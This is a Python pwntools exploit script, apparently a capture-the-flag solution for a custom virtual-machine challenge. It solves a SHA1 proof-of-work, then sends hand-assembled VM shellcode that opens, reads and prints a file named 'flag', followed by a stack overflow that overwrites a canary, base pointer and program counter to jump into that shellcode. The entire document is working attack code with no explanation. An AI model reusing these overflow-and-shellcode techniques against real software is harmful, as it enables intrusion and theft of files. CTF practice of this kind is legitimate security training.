from pwn import *
from hashlib import *

r = process("./vm_name.py")

def p21(dt):
	a = chr(dt & 0b1111111)
	a += chr((dt>>14) & 0b1111111)
	a += chr((dt>>7) & 0b1111111)

	return a

def inst(op, op_type, op1, op2):
	if op_type == 0:
		p = ((op&0b11111)<<9) | ((op_type&1)<<8) | ((op1&0b1111)<<4) | ((op2&0b1111))
		p = chr(p>>7) + chr(p&0b1111111)

	elif op_type == 1:
		p = ((op&0b11111)<<9) | ((op_type&1)<<8) | ((op1&0b1111)<<4)
		p = chr(p>>7) + chr(p&0b1111111)
		p += p21(op2)

	return p

print r.recvuntil("prefix : ")
prefix = r.recvuntil("\n")[:-1]

print prefix

i = 0

while True:
	h = prefix + str(i).zfill(8)
	sha = new("SHA1")
	sha.update(h)
	if sha.hexdigest()[-6:] == "000000":
		print "found: " + h
		break
	i += 1

r.sendline(h)

print r.recvuntil("name>")

payload = "flag\x00" 			# 0xf5f9e
payload += inst(4, 1, 0, 0x1)		# r0 = 1
payload += inst(4, 1, 1, 0xf5f9e)	# r1 = "flag\x00"
payload += inst(8, 0, 0, 0)		# open("flag\x00")

payload += inst(4, 1, 0, 0x3)		# r0 = 3, write
payload += inst(4, 1, 1, 0x2)		# r1 = 2, fd(stdin, stdout, flag)
payload += inst(4, 1, 2, 0xf5f00)	# r2 = 0xf5f00, buf
payload += inst(4, 1, 3, 0x40)		# r3 = 0x40, len
payload += inst(8, 0, 0, 0)		# read(2, buf, 0x40)

payload += inst(4, 1, 0, 0x2)           # r0 = 2, write
payload += inst(4, 1, 1, 0x1)		# r1 = 1, fd
payload += inst(8, 0, 0, 0)		# write(1, buf, 0x40)

payload += "A" * (57-len(payload))	# padding
payload += p21(0x12345)			# canary
payload += p21(0x4141)			# bp
payload += p21(0xf5f9e+5)		# pc

r.sendline(payload)

r.interactive()
